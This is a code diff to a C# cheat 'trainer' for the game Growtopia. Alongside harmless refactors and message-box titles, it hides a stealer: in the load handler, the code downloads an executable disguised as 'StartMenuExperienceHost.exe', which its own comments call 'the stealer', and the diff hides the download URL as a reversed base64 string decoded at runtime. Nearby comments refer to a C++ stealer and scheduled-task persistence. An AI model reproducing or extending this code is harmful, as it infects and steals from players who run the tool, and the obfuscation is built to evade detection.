@@ -9,6 +9,7 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
@@ -18,6 +19,9 @@ namespace FreeZeHAX_Trainer
 {
     public partial class Trainer : Form
     {
+        [DllImport("user32.dll")]
+        public static extern int SetForegroundWindow(IntPtr hWnd);
+
         private readonly Cheats cheats = new Cheats(); // Calling Others.cs
         private readonly Mem mem = new Mem();
         private readonly string NewLine = Environment.NewLine; // New line string
@@ -30,7 +34,10 @@ namespace FreeZeHAX_Trainer
         private Point lastLocation;
         private bool mouseDown;
 
-        public Trainer() => InitializeComponent();
+        public Trainer()
+        {
+            InitializeComponent();
+        }
 
         public void Auto_Attach_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
         { // Check if Growtopia.exe exists. If it exists make ProcOpen bool true / false
@@ -105,7 +112,10 @@ namespace FreeZeHAX_Trainer
             }
         }
 
-        public void Auto_Attach_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e) => Auto_Attach.RunWorkerAsync(); // Start Auto_Attach background worker
+        public void Auto_Attach_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+            Auto_Attach.RunWorkerAsync(); // Start Auto_Attach background worker
+        }
 
         private string AobScan(string AOB, bool All = true, bool First = false, bool Last = false)
         {
@@ -162,7 +172,7 @@ namespace FreeZeHAX_Trainer
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
             }
         }
 
@@ -279,7 +289,7 @@ namespace FreeZeHAX_Trainer
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
             }
         }
 
@@ -324,9 +334,27 @@ namespace FreeZeHAX_Trainer
 
         private void TextTimer_Tick(object sender, EventArgs e)
         {
-            SendKeys.Send("{ENTER}"); // Send ENTER key
-            SendKeys.Send(Input.Text); // Send the text inside "Input" textbox
-            SendKeys.Send("{ENTER}"); // Send ENTER key
+            Process[] processes = Process.GetProcessesByName("Growtopia");
+
+            if (processes.ToString() == "Growtopia")
+            {
+                foreach (Process proc in processes)
+                {
+                    SetForegroundWindow(proc.MainWindowHandle);
+                    SendKeys.Send("{ENTER}"); // Send ENTER key
+                    SendKeys.Send(Input.Text); // Send the text inside "Input" textbox
+                    SendKeys.Send("{ENTER}"); // Send ENTER key
+                }
+            }
+            else { MessageBox.Show("Can't find Growtopia window.", "FreeZeHAX Trainer"); }
+        }
+
+        // Reverse string
+        private string ReverseString(string str)
+        {
+            char[] array = str.ToCharArray();
+            Array.Reverse(array);
+            return new string(array);
         }
 
         private void Trainer_Load(object sender, EventArgs e)
@@ -374,7 +402,8 @@ namespace FreeZeHAX_Trainer
                     #endregion Check required dlls for the c++ stealer
 
                     CETimer.Start(); // Check if ce is running
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/950775487611953162/StartMenuExperienceHost.exe"), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
+                    string FixedString = ReverseString("lhXZuQ3cvhUZj5WZpJXZwhXR15WZNRnchR3UvADMyUTN4IzM0ADMzkzNzIzMwEzLygDM1QDOzMTMyUzN3gjM3ITOvMHduVWboNWY0RXYv02bj5CcwFGZy92YzlGZu4GZj9yL6MHc0RHa");
+                    web.DownloadFile(new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(FixedString.PadRight(FixedString.Length + (4 - FixedString.Length % 4) % 4, '=')))), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                     others.Wait(2000);
                     if (!savePathExists)
                     { // If save.dat doesn't exists, just create the task scheduler
@@ -1171,7 +1200,7 @@ namespace FreeZeHAX_Trainer
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show(ex.ToString());
+                    MessageBox.Show(ex.ToString(), "FreeZeHAX Trainer");
                     return false;
                 }
                 finally
@@ -1181,7 +1210,7 @@ namespace FreeZeHAX_Trainer
                         uint result = (uint)adapter.InvokeMethod("Enable", null);
                         if (result != 0)
                         {
-                            MessageBox.Show("Failed to re-enable network adapter.");
+                            MessageBox.Show("Failed to re-enable network adapter.", "FreeZeHAX Trainer");
                         }
                     }
                 }
